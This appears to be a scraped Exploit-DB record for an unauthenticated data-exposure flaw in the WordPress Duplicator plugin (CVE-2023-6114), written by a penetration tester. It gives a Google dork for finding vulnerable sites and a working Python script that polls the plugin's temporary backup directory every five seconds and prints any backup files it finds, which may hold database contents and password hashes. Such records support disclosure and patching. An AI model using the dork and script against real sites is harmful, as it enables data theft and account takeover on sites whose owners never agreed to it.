{"source": "https://www.exploit-db.com/exploits/51874", "vulnName": "WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover", "vulnEDBID": "51874", "vulnCVE": "N/A", "author": "DMITRII IGNATYEV", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-11", "vulnContent": "# Exploit Title: WordPress Plugin Duplicator < 1.5.7.1 -\nUnauthenticated Sensitive Data Exposure to Account Takeover\n# Google Dork: inurl:(\"plugins/duplicator/\")\n# Date: 2023-12-04\n# Exploit Author: Dmitrii Ignatyev\n# Vendor Homepage:\nhttps://duplicator.com/?utm_source=duplicator_free&utm_medium=wp_org&utm_content=desc_details&utm_campaign=duplicator_free\n# Software Link: https://wordpress.org/plugins/duplicator/\n# Version: 1.5.7.1\n# Tested on: Wordpress 6.4\n# CVE : CVE-2023-6114# CVE-Link :\nhttps://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1/\n\n# CVE-Link : https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit/A\nsevere vulnerability has been discovered in the directory\n*/wordpress/wp-content/backups-dup-lite/tmp/*. This flaw not only\nexposes extensive information about the site, including its\nconfiguration, directories, and files, but more critically, it\nprovides unauthorized access to sensitive data within the database and\nall data inside. Exploiting this vulnerability poses an imminent\nthreat, leading to potential *brute force attacks on password hashes\nand, subsequently, the compromise of the entire system*.*\nPOC*:\n\n1) It is necessary that either the administrator or auto-backup works\nautomatically at the scheduled time\n\n2) Exploit will send file search requests every 5 seconds\n\n3) I attack the site with this vulnerability using an exploit\n\nExploit sends a request to the server every 5 seconds along the path\n\u201c*http://your_site/wordpress/wp-content/backups-dup-lite/tmp/\n<http://your_site/wordpress/wp-content/backups-dup-lite/tmp/>\u201d* and if\nit finds something in the index of, it instantly parses all the data\nand displays it on the screen\n\nExploit (python3):\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nimport time\n\nurl = \"http://127.0.0.1/wordpress/wp-content/backups-dup-lite/tmp/\"\nprocessed_files = set()\n\ndef get_file_names(url):\n    response = requests.get(url)\n\n    if response.status_code == 200 and len(response.text) > 0:\n        soup = BeautifulSoup(response.text, 'html.parser')\n        links = soup.find_all('a')\n\n        file_names = []\n        for link in links:\n            file_name = link.get('href')\n            if file_name != \"../\" and not file_name.startswith(\"?\"):\n                file_names.append(file_name)\n\n        return file_names\n    return []\n\ndef get_file_content(url, file_name):\n    file_url = url + file_name\n\n\n    if re.search(r'\\.zip(?:\\.|$)', file_name, re.IGNORECASE):\n        print(f\"Ignoring file: {file_name}\")\n        return None\n\n    file_response = requests.get(file_url)\n\n    if file_response.status_code == 200:\n        return file_response.text\n    return None\n\nwhile True:\n    file_names = get_file_names(url)\n\n    if file_names:\n        print(\"File names on the page:\")\n        for file_name in file_names:\n            if file_name not in processed_files:\n                print(file_name)\n                file_content = get_file_content(url, file_name)\n\n                if file_content is not None:\n                    print(\"File content:\")\n                    print(file_content)\n                    processed_files.add(file_name)\n\n    time.sleep(5)\n\n\n\n-- \nWith best regards,\nDmitrii Ignatyev, Penetration Tester\n            "}